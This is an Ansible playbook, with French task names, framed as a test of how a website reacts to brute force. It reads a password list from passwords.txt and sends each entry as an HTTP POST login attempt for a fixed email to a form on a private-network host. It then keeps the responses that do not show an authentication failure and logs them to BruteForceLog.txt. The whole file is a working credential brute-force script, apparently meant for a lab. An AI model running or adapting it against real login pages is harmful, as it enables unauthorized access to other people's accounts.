---
- name: Tester la réaction du site en cas de bruteforce
  hosts: localhost
  tasks:
    - name: Lire le fichier passwords.txt et stocker son contenu dans une variable
      shell: cat passwords.txt
      register: passwords_content
      changed_when: false
      check_mode: no

    - name: Diviser le contenu du fichier en lignes et stocker dans une liste
      set_fact:
        passwords_list: "{{ passwords_content.stdout_lines }}"

    - name: Envoyer des requêtes HTTP POST
      uri:
        url: "http://192.168.56.2:5000/form"
        method: POST
        return_content: yes
        body_format: form-urlencoded
        body:
          email: "jup.solar@milky.way"
          password: "{{ item }}"
        status_code: 200
      with_items: "{{ passwords_list }}"
      register: response
  
    - name: Ranger les réponses avec le statut 200 dans une liste
      set_fact:
        successful_responses: "{{ response.results | selectattr('status', 'equalto', 200) | selectattr('content', 'ne', 'Authentification Problem.') | list }}"


    - name: Ajouter les mots de passe réussis au fichier de log
      lineinfile:
        path: BruteForceLog.txt
        line: "{{ item.content }}"
        create: yes
      with_items: "{{ successful_responses }}"
      